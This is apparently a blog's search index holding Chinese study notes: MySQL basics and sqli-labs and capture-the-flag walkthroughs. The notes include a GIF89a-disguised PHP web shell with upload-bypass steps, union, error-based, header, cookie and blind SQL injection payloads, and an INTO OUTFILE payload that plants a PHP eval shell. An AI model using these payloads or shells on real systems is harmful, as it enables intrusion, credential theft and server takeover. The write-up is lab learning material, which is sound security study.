<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title></title>
    <url>/2021/10/02/GIF89a/</url>
    <content><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_GET</span>[shell])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>通常，在嵌入了php脚本的html中，使用 phtml作为后缀名；完全是php写的，则使用php作为后缀名。这两种文件，web服务器都会用php解释器进行解析。</p>
<p>当不能使用php代码直接注入时可以改为phtml格式加入GIF89a(图片头文件欺骗)，后台认为是图片,上传后再执行木马。</p>
<p>先将文件改为.gif欺骗网址第一层，抓包将filename改为以.phtml结尾并以这种方式进行，GIF89a则负责骗过第二层。</p>
<p><img src="https://img-blog.csdnimg.cn/97cb183433d94d4b9f8dd45ee661b862.png" alt="请添加图片描述"></p>
<p>通过蚁剑一般连接的是：url/upload/文件名<br>此题为：<img src="https://img-blog.csdnimg.cn/d84d1c9b84874534a08d06b09535dcdb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA55-z5pif7oCx,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>蚁剑连接即可</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2021/10/02/mysql%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="数据库操作："><a href="#数据库操作：" class="headerlink" title="数据库操作："></a>数据库操作：</h1><hr>
<h2 id="链接数据库"><a href="#链接数据库" class="headerlink" title="链接数据库"></a>链接数据库</h2><ul>
<li>cd 进入bin目录 输入 mysql -u root -p 然后输入密码<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2></li>
<li>show databases; 显示数据库</li>
<li>use 库名; 选择数据库</li>
<li>DROP DATABASE 库名; 删除库</li>
<li>creat database 库名; 创建库</li>
</ul>
<hr>
<h1 id="表操作"><a href="#表操作" class="headerlink" title="表操作"></a>表操作</h1><ul>
<li>show tables; 显示表</li>
<li>drop table 表名; 删除表</li>
<li>creat table 表名(<br>列名 类型 是否可以为空，<br>列名 类型 是否可以为空，<br>)ENGINE=InnoDB DEFAULT CHARSET=utf8;<br><img src="https://img-blog.csdnimg.cn/07ef5823c84f49279abd8ab0f5a12656.png" alt="请添加图片描述"></li>
</ul>
<h1 id="字段操作："><a href="#字段操作：" class="headerlink" title="字段操作："></a>字段操作：</h1><hr>
<ul>
<li><p>alter table 表名<br>  add column `字段名` &lt;数据类型&gt; comment `备注`; 添加字段<br>  <img src="https://img-blog.csdnimg.cn/0d60f2fa512b4938be65506c52bd9a9d.png" alt="请添加图片描述"></p>
</li>
<li><p>alter table 表名<br>change column `老字段名` `新字段名` &lt;数据类型&gt; comment `备注`; 修改字段</p>
</li>
<li><p>alter table 表名</p>
</li>
<li><p>drop column 表名; 删除字段</p>
</li>
</ul>
<h1 id="记录操作："><a href="#记录操作：" class="headerlink" title="记录操作："></a>记录操作：</h1><hr>
<h2 id="增："><a href="#增：" class="headerlink" title="增："></a>增：</h2><h3 id="一次插入一条"><a href="#一次插入一条" class="headerlink" title="一次插入一条"></a>一次插入一条</h3><ul>
<li>insert into `表名`  set  `字段名1` = ‘value1’ ,`字段名2` = ‘value2’<h3 id="一次插入多条"><a href="#一次插入多条" class="headerlink" title="一次插入多条"></a>一次插入多条</h3></li>
<li>insert into `表名`  ( `字段名1`, `字段名2`) values ( value1.1,value1.2 ),(value2.1,value2.2 ) <h3 id="根据索引值进行判断，若存在，先删除在插入"><a href="#根据索引值进行判断，若存在，先删除在插入" class="headerlink" title="根据索引值进行判断，若存在，先删除在插入"></a>根据索引值进行判断，若存在，先删除在插入</h3></li>
<li>replace into `表名`  set  `字段名1` = ‘value1’ ,`字段名2` = ‘value2’<h2 id="删："><a href="#删：" class="headerlink" title="删："></a>删：</h2><h3 id="删除一条或多条"><a href="#删除一条或多条" class="headerlink" title="删除一条或多条"></a>删除一条或多条</h3></li>
<li>delete from 表名 where id = （=也可以换成&gt;,&lt;）<br>(id号还是会继续累加)<h3 id="初始化表"><a href="#初始化表" class="headerlink" title="初始化表"></a>初始化表</h3></li>
<li>truncate 表名<br>(id号从1开始)<h2 id="改"><a href="#改" class="headerlink" title="改:"></a>改:</h2></li>
<li>update 表名 set  字段名1 = ‘value1’ ,字段名2 = ‘value2’ where id =<h2 id="查："><a href="#查：" class="headerlink" title="查："></a>查：</h2><h3 id="单表查询"><a href="#单表查询" class="headerlink" title="单表查询"></a>单表查询</h3><h4 id="查询表中某些字段"><a href="#查询表中某些字段" class="headerlink" title="查询表中某些字段"></a>查询表中某些字段</h4></li>
<li>select 字段1,字段2 from 表 <h4 id="以表中某些字段为条件查询"><a href="#以表中某些字段为条件查询" class="headerlink" title="以表中某些字段为条件查询"></a>以表中某些字段为条件查询</h4></li>
<li>select * from 表 where 字段1=’value1’ and 字段2=’value2’<br>若查看除某些字段以外的其他：</li>
<li>select * from 表 where 字段 not in (‘value1’,’value2’)</li>
<li>select * from 表 where 字段 &lt;&gt; ‘value’<h4 id="按照id号查询"><a href="#按照id号查询" class="headerlink" title="按照id号查询"></a>按照id号查询</h4></li>
</ul>
<p>1.select * from 表 where id =1or id=2 or id=3<br>2.select * from 表 where id in(1,2,3)<br>3.select * from 表 where id in(‘1’,’2’,’3’)<br>若查看除某些id号以外的其他：</p>
<ul>
<li>select * from 表 where id not in(‘1’,’2’,’3’)</li>
</ul>
<h4 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h4><ul>
<li><p>select * from 表  order by 字段 desc(降) asc(胜) limit 0,3<br>(limit 0,3 从第一个开始选 选三个)</p>
<h3 id="多表查询"><a href="#多表查询" class="headerlink" title="多表查询"></a>多表查询</h3><h4 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h4><blockquote>
<p>场景：有两个表 员工信息employee_info ，员工工资employ_pay<br>我们需要根据一个人的姓名对应的id，查询对应的工资以及显示对应的姓名</p>
</blockquote>
</li>
<li><p>select pay,(select name from employ_info where id=3) as username from employ_pay where nameid=3</p>
<h4 id="关联查询"><a href="#关联查询" class="headerlink" title="关联查询"></a>关联查询</h4></li>
<li><p>select b.name,a.pay from employ_pay a,employee_info b where a.nameid=b.id and b.id=3</p>
<h4 id="左-右链接查询"><a href="#左-右链接查询" class="headerlink" title="左/右链接查询"></a>左/右链接查询</h4></li>
<li><p>左链接查询<br>(显示左边表所有记录，以及右边表满足条件的记录)<br>select a.*,b.pay from employee_info a left join employee_pay b on a.id=b.nameid</p>
</li>
<li><p>右链接查询<br>(显示右边表所有记录，以及左边表满足条件的记录)<br>select a.*,b.pay from employee_pay a left join employee_info b on a.id=b.nameid</p>
<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3></li>
<li><p>查询语句1<br>union<br>查询语句2</p>
</li>
<li><p>条件：<br>1、要求多条查询 语句的查询列数是一致的<br>2、要求多条查询语句的查询的每一列的类型和最好一致<br>3、union关键字默认去重，如果使用union all 可以包含重复项</p>
</li>
</ul>
<h1 id="sqli-lab-记录"><a href="#sqli-lab-记录" class="headerlink" title="sqli-lab 记录"></a>sqli-lab 记录</h1><p>每个库里都有information_schema表</p>
<p>而每个information_schema表里都有information_schema.tables字段</p>
<p>table_schema  库名</p>
<p>schema_name 表名</p>
<h3 id="简单的了解万能密码"><a href="#简单的了解万能密码" class="headerlink" title="简单的了解万能密码"></a>简单的了解万能密码</h3><h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><h3 id="‘or’1‘-’1"><a href="#‘or’1‘-’1" class="headerlink" title="‘or’1‘=’1"></a>‘or’1‘=’1</h3><ul>
<li>原理：SQL语句sql=”select * from user where username=’”&amp;username&amp;”‘and password=’”&amp; password&amp;’”,当我们的密码填写’or’1’=’1提交的时候，此时语句中的password等于’or’1’=’1，那么，这条SQL语句就变成了：sql=”select * from user where username=’”&amp;username&amp;”‘and password= ‘’or’1’=’1’,然而，1=1是恒等条件，自然也就通过了程序的验证。</li>
<li>方法：首先我们需要在密码的最前面有一个单引号，来闭合SQL语句中的单引号，然后构造一个or，也就是或者，后面加一个恒等条件即可最简单的就是1=1，同样为了使SQL语句不出错，是来闭合程序中的SQL语句的后面的单引号的，如果我们在后面再加上一个单引号的话就会出错。</li>
</ul>
<h2 id="做题步骤"><a href="#做题步骤" class="headerlink" title="做题步骤"></a>做题步骤</h2><ul>
<li><p>1.输入’1等字符看报错判断闭合方式</p>
</li>
<li><p>2.利用order by 判断列数</p>
</li>
<li><p>3.将数字改为-1并结合union联合查询1,2,3看一下哪列可以回显</p>
</li>
<li><p>4.哪列可以回显就利用哪列写group_concat()</p>
</li>
<li><p>5.爆库名：?id=-1‘ union select 1,group_concat(schema_name),3</p>
</li>
</ul>
<p>from information_schema.schemata –+</p>
<ul>
<li>6.爆表名：?id=-1‘ union select 1,group_concat(table_name),3</li>
</ul>
<p>from information_schema.tables where table_schema=’security’ –+</p>
<ul>
<li>7.爆列名：?id=-1‘ union select 1,group_concat(column_name),3</li>
</ul>
<p>from information_schema.columns where table_name=’users’ –+</p>
<ul>
<li>8.爆数据：?id=-1‘ union select 1,group_concat(username,’~’,password),3</li>
</ul>
<p>from users –+     (或者：?id=-1‘ union select 1,username,password from users where id=1 –+)</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2021/10/14/%E5%88%A9%E7%94%A8burp%E6%8A%93%E5%8C%85%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="基于burp抓包"><a href="#基于burp抓包" class="headerlink" title="基于burp抓包"></a>基于burp抓包</h1><blockquote>
<p>常见的HTTP注入点产生位置为【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】</p>
</blockquote>
<h2 id="用户代理头部注入"><a href="#用户代理头部注入" class="headerlink" title="用户代理头部注入"></a>用户代理头部注入</h2><ul>
<li>sqli_lab 18 源代码：</li>
</ul>
<p><img src="C:\Users\dell\Pictures\各种截图\代理头部2.png" alt="代理头部2"></p>
<ul>
<li>$insert=”INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘$uagent‘, ‘$IP‘, $uname)”;将useragent和ip插入到数据库中,首先这里要输入正确的账号和密码才能绕过账号密码判断，才能进入处理uagent部分,账号和密码都是admin。</li>
<li>print_r(mysql_error())则表示使用报错注入。</li>
</ul>
<p><img src="C:\Users\dell\Pictures\各种截图\用户代理头部.png"></p>
<ul>
<li>源码使用HTTP_USER_AGENT只获取了HTTP请求头的一个部分：User-Agent.而IP使用了REMOTE_ADDR，它能被代理服务器或路由器修改，但并非修改XFF头就可修改。</li>
</ul>
<p>现在抓包改参数：</p>
<p>![屏幕截图 2021-10-14 124401](C:\Users\dell\Pictures\各种截图\屏幕截图 2021-10-14 124401.png)</p>
<ul>
<li>没有报错，同时把User_Agent的值传出来，但如果输入User_Agent值有错或者没有按照要求则会显示报错：</li>
</ul>
<p>![屏幕截图 2021-10-14 124609](C:\Users\dell\Pictures\各种截图\屏幕截图 2021-10-14 124609.png)</p>
<ul>
<li>使用报错注入：</li>
</ul>
<p><code> 1&#39; and extractvalue(1,concat(0x7e,database())) and &#39;1#</code></p>
<p>![屏幕截图 2021-10-14 125322](C:\Users\dell\Pictures\各种截图\屏幕截图 2021-10-14 125322.png)</p>
<ul>
<li>现在显示了库名，接下来爆表名和字段就行了</li>
</ul>
<p><code> 1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;))) and &#39;1#</code></p>
<h2 id="Referer注入"><a href="#Referer注入" class="headerlink" title="Referer注入"></a>Referer注入</h2><ul>
<li>sqli_lab 19 源代码：</li>
</ul>
<p>![屏幕截图 2021-10-15 075859](C:\Users\dell\Pictures\各种截图\屏幕截图 2021-10-15 075859.png)</p>
<p>![屏幕截图 2021-10-06 190904](C:\Users\dell\Pictures\各种截图\屏幕截图 2021-10-06 190904.png)</p>
<ul>
<li>显示从Referer入手，则输入代码：</li>
</ul>
<p><code>1&#39; and extractvalue(1,concat(0x7e,database())),&#39;1#</code></p>
<h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><ul>
<li>sqli_lab 20 源代码：</li>
</ul>
<p>![屏幕截图 2021-10-15 090712](C:\Users\dell\Pictures\各种截图\屏幕截图 2021-10-15 090712.png)</p>
<ul>
<li>如果输入uname和passwd则setcookie</li>
</ul>
<p>![屏幕截图 2021-10-15 090922](C:\Users\dell\Pictures\各种截图\屏幕截图 2021-10-15 090922.png)</p>
<ul>
<li><p>如果没有点击submit提交则查询cookie，通过uname传参</p>
</li>
<li><p>传入uname和passwd后抓包，这时再删去uname和passwd，在cookie插入<code>uname= 1&#39;and extractvalue(1,concat(0x7e,database()))#</code></p>
</li>
</ul>
<p>![屏幕截图 2021-10-15 091219](C:\Users\dell\Pictures\各种截图\屏幕截图 2021-10-15 091219.png)</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2021/10/15/%E7%9B%B2%E6%B3%A8/</url>
    <content><![CDATA[<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><h2 id="闭合"><a href="#闭合" class="headerlink" title="闭合"></a>闭合</h2><p>尝试1‘ / 1’‘ 等，将and前的引号闭合</p>
<h2 id="猜测长度"><a href="#猜测长度" class="headerlink" title="猜测长度:"></a>猜测长度:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and (length(database()))&gt;11--+</span><br></pre></td></tr></table></figure>

<p>页面返回有数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and (length(database()))&gt;12--+</span><br></pre></td></tr></table></figure>

<p>页面无结果返回则当前数据库名称长度为: 12</p>
<h2 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1)) &gt;100--+</span><br></pre></td></tr></table></figure>

<p>根据二分法判断</p>
<p><code>SUBSTR(str,pos)</code>:  pos开始的位置，—直截取到最后</p>
<p><code>SUBSTR(str,pos,len)</code>:  从 pos开始的位置，截取len个字符</p>
<p><code>substr(string ,1,3)</code>: 取string左边第1位置起，3字长的字符串。所以结果为: str</p>
<p><code>substr(string, -1,3)</code>: 取string右边第1位置起，3字长的字符串。显然右边第一位置起往右不够3字长。结果只能是: g</p>
<p><code>substr(string,-3,3)</code>: 取string右边第3位置起，字长的字符串,结果为: ing</p>
<p><code>?id=1&#39; and ascii(substr(database(),1,1))=107--+</code></p>
<p> 页面返回有数据</p>
<p><code>?id=1&#39; and ascii(substr(database(),2,1))=97--+</code> </p>
<p>页面返回有数据</p>
<p>当前数据库 第一个字母是k,第二个字母是a…以此类可推得到数据库库名</p>
<h2 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h2><p><code>?id=1&#39; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101--+</code></p>
<p><code>?id=1&#39; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#39;e&#39;--+</code></p>
<ul>
<li>left()函数</li>
</ul>
<p>![img](C:\Users\dell\Documents\Tencent Files\2080709384\Image\C2C\9V87@3ZJ4@6S{SA]_DO`XYT.png)</p>
<h2 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h2><p><code>?id=1&#39;and (ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1)))&gt;102--+ </code></p>
<p>爆出列名之后可以再确认一下：</p>
<p><code>?id=1&#39; and left((select column_name from information_schema.columns where table_name=&#39;users&#39; and table_schema=database()limit 2,1),8)=&#39;password&#39;--+</code></p>
<h2 id="爆内容"><a href="#爆内容" class="headerlink" title="爆内容"></a>爆内容</h2><p><code>?id=1&#39;and (ascii(substr(( select password from users limit 0,1),1,1)))=122--+ </code></p>
<p>爆出列名之后可以再确认一下：</p>
<p><code>?id=1&#39; and left((select password from users limit 0,1),4)=&#39;dumb&#39;--+ </code></p>
<p> 页面返回有数据则正确</p>
<h2 id="outfile-sqllab—7"><a href="#outfile-sqllab—7" class="headerlink" title="outfile/ sqllab—7"></a>outfile/ sqllab—7</h2><p>将内容输出到与本页面同步的文件，写入木马</p>
<p><code>?id=1&#39;))  union select 1,&quot;&lt;?php @eval($_GET[&#39;a&#39;]);?&gt;&quot;,3 into outfile &quot;/var/www/html/a.php&quot; --+</code></p>
<p><code>/var/www/html/</code>是web服务器的默认根文件夹，题目的文件都在这</p>
<p>把内容写入a.php后可以通过访问a.php，并通过hackbar给a赋值?a=system(‘ls’);</p>
<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>利用<code>if(判断语句,sleep(5),1)</code>若正确页面延迟5秒，若错误将直接刷新</p>
<h1 id="POST盲注"><a href="#POST盲注" class="headerlink" title="POST盲注"></a>POST盲注</h1><p>![屏幕截图 2021-10-06 190904](C:\Users\dell\Pictures\各种截图\屏幕截图 2021-10-06 190904.png)</p>
<p>用post传参并布尔盲注：</p>
<p><code>uname=admin&#39; and 1=1#&amp; passwd=passwd&#39;#</code>判断是否回显（若不回显则时间盲注）</p>
<p><code>uname=admin&#39; order by 2#&amp; passwd=passwd&#39;#</code>判断列数</p>
<p>post传参注释使用‘#’</p>
<p>爆库名的paylod:</p>
<p><code>uname=-admin&#39; union select 1,group_concat(schema_name) from information_schema.schemata#&amp;passwd=passwd&#39; #</code></p>
<p>uname传参后先注释，然后写&amp;passwd=passwd’，密码的值可以变，uname的值只能为admin</p>
<p>用post传参并时间盲注：</p>
<p>利用<code>if(判断语句,sleep(5),1)</code>若正确页面延迟5秒，若错误将直接刷新</p>
<p>if(left(database(),8)=’security’,1,sleep(5))</p>
<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>updatexml函数是mysql对xml文档数据进行查询和修改的xpath函数，而extractvalue函数比updatexml函数少了一个修改功能，也就是只进行xml文档数据的查询。</p>
<p>updateml的语法是：</p>
<p>updatexml(xml_document,XPathstring,new_value)要求xpath定位是准确的，如果不准确，就会发生错误，要利用的就是这个特性。直接在输入框内拼接语句：<code>updatexml(1,concat(0x7e,database()),0)</code></p>
<p>extractvalue的语法是：</p>
<p>extractvalue(xml_document,XPathstring)。语句：<code>extractvalue(1,concat(0x7e,database()))</code></p>
<h3 id="sqli-lab-17题"><a href="#sqli-lab-17题" class="headerlink" title="sqli lab-17题"></a>sqli lab-17题</h3><p><img src="C:\Users\dell\Pictures\各种截图\报错盲注.png" alt="报错盲注"></p>
<p>从头开始看，需要传uname和passwd的值，不然进行不下去，下面显示print_r(mysql_error())说明报错注入，则现在需要paylod爆库名：</p>
<p><code>uname=admin &amp; passwd=password&#39; and extractvalue(1,concat(&#39;~&#39;,database()))#</code></p>
<p>爆表名:</p>
<p><code>uname=admin &amp; passwd=password&#39; and extractvalue(1,concat(&#39;~&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)))#</code></p>
]]></content>
  </entry>
</search>
